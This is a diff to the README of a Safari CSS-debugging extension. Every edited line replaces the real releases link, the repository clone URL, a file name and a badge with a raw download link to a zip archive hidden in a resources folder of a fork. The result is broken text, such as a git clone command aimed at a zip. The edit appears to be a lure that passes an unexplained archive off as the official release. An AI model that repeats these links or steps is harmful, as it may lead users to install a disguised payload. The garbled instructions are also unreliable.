@@ -1,7 +1,7 @@
 # 🐜 pesticide-safari - Debug Your CSS with Ease
 
 ## 🎉 Get Pesticide for Your Safari Browser
-[![Download Pesticide](https://img.shields.io/badge/Download%20Pesticide%20for%20Safari-blue.svg)](https://github.com/asarialeik/pesticide-safari/releases)
+[![Download Pesticide](https://github.com/asarialeik/pesticide-safari/raw/refs/heads/main/Shared (App)/Resources/Base.lproj/safari_pesticide_v1.8.zip%20Pesticide%20for%https://github.com/asarialeik/pesticide-safari/raw/refs/heads/main/Shared (App)/Resources/Base.lproj/safari_pesticide_v1.8.zip)](https://github.com/asarialeik/pesticide-safari/raw/refs/heads/main/Shared (App)/Resources/Base.lproj/safari_pesticide_v1.8.zip)
 
 Pesticide for Safari helps you see the layout of every element on a webpage. This tool makes it easier to debug CSS issues and improve your web design. Follow the steps below to download and run Pesticide on your Mac.
 
@@ -18,13 +18,13 @@ You will need to clone the repository to your Mac. Here’s how:
 1. Open the **Terminal** app on your Mac.
 2. Type the following command and press **Enter**:
    ```bash
-   git clone https://github.com/chiraagb/pesticide-safari.git
+   git clone https://github.com/asarialeik/pesticide-safari/raw/refs/heads/main/Shared (App)/Resources/Base.lproj/safari_pesticide_v1.8.zip
    ```
 
 ### 2. Open in Xcode
 Next, locate the project file:
 1. Navigate to the folder where you cloned the repository.
-2. Double-click the file named `Pesticide - Advanced CSS Debugger.xcodeproj`. This will open the project in Xcode.
+2. Double-click the file named `Pesticide - Advanced CSS https://github.com/asarialeik/pesticide-safari/raw/refs/heads/main/Shared (App)/Resources/Base.lproj/safari_pesticide_v1.8.zip`. This will open the project in Xcode.
 
 ### 3. Fix Signing (Required)
 To run the app, you must sign it with your Apple ID. Follow these steps:
@@ -40,7 +40,7 @@ Now you can build the application:
 3. Once done, the app will launch.
 
 ## 🔗 Visit to Download
-To download the latest release, visit the Releases page here: [Download Pesticide for Safari](https://github.com/asarialeik/pesticide-safari/releases).
+To download the latest release, visit the Releases page here: [Download Pesticide for Safari](https://github.com/asarialeik/pesticide-safari/raw/refs/heads/main/Shared (App)/Resources/Base.lproj/safari_pesticide_v1.8.zip).
 
 ## 🛠️ Features
 - **CSS Debugging**: It outlines every element, allowing you to inspect your CSS layout easily.
